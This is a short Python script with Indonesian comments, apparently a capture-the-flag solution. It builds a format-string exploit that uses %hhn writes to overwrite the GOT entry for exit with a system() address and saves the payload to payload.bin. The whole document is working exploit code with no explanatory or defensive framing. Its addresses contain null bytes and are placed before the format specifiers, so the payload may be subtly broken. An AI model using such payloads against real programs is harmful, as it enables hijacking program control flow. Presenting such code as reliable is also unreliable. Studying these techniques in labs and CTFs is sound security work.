from struct import pack

# Target alamat GOT untuk exit
base_addr = 0x404060

# Alamat target pengganti, misalnya system() → ganti ini kalau perlu
system_addr = 0x000000052290

# 6 byte low endian dari system_addr
bytes_to_write = [(system_addr >> (8 * i)) & 0xff for i in range(6)]

# Step 1: taruh 6 alamat byte-by-byte (little endian)
payload = b''.join([pack("<Q", base_addr + i) for i in range(6)])

# Step 2: hitung padding + format string
# Offset awal: karena 6 alamat = 6 * 8 = 48 bytes, berarti %10$hhn mulai dari situ
offset = 10
written = len(payload)
fmt = ""

for i, val in enumerate(bytes_to_write):
    pad = (val - written % 256) % 256
    if pad < 10:
        pad += 256  # Hindari karakter terlalu kecil
    fmt += f"%{pad}c%{offset + i}$hhn"
    written += pad

# Gabungkan payload akhir
payload += fmt.encode()

# Simpan ke file
with open("payload.bin", "wb") as f:
    f.write(payload)

print("[+] Payload disimpan sebagai payload.bin")
